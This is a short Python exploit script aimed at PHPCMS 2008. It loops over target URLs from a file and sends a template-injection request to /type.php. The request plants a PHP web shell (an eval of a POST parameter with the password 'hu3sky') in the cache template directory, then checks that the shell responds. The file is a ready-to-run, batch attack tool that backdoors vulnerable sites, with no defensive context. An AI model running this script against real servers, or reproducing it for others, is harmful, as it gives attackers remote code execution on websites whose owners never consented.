# -*- coding: utf-8 -*-
# @Time    : 2019-01-06 14:45
# @Author  : Hu3sky
# @FileName: phpcms2008_exp.py
# @Software: Submie

import requests
import time
import base64

#-------------------
path = "/type.php"
payload = "template=tag_(){};eval($_POST[hu3sky]);{//../rss"
shell_path = "/data/cache_template/rss.tpl.php"
data={"hu3sky":"phpinfo();"}
#-------------------

f1 = open('url.txt','r')

def phpcms_exp():
	for line in f1.readlines():
		line = line.replace('\n','/')
		url1 = line + path
		print("[+]url: "+url1)
		try:
			# 生成缓存模板文件的小马
			target1 = requests.get(url1,params=payload)
			final_shell = line+shell_path
			# 访问小马,检测是否生成成功
			target2 = requests.post(final_shell,data=data)
			if target2.status_code == 200:
				print("[+]Successfully!The shell is"+target2.url)
				print("[+]The pass is hu3sky")
			else:
				print("[-]Maybe "+line+" didnt has the vuln")
		except Exception as e:
			print(e)

if __name__ == '__main__':
	phpcms_exp()